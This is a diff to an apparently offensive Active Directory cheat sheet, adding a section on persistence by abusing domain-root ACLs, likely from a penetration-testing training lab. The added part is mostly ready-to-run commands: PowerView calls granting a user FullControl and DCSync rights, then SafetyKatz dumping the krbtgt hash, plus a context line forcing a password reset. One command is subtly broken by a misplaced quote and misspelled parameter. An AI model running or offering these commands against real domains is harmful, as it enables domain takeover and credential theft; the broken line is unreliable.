@@ -16,7 +16,7 @@
   * [Skeleton Key](#persistence-using-skeleton-key)
   * [DSRM](#persistence-using-dsrm)
   * [ACLs AdminSDHolder](#persistence-using-acls-adminsdholder)
-  * 
+  * [ACLs Rights Abuse](#persistence-using-acls-rights-abuse)
 
 ## General
 Connect to a machine with Administrator privileges
@@ -915,7 +915,23 @@ Abusing ResetPassword using PowerView
 Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString "Password123@" -AsPlainText -Force) -Verbose
 ```
 
+## Persistence using ACLs Rights Abuse
+There are interesting ACLs which can be abused. For example, with DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run "DCSync"
 
+Add FullControl rights:
+```
+Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local0 -PrincipalIdentity <username> -Rights All -PricipalDomain <domain> -TargetDomain <domain> -Verbose
+```
+
+Add rights for DCSync
+```
+Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity <username> -Rights DCSync -PrincipalDomain <domain> -TargetDomain <domain> -Verbose
+```
+
+Then execute DCSync
+```
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+```
 
 
 
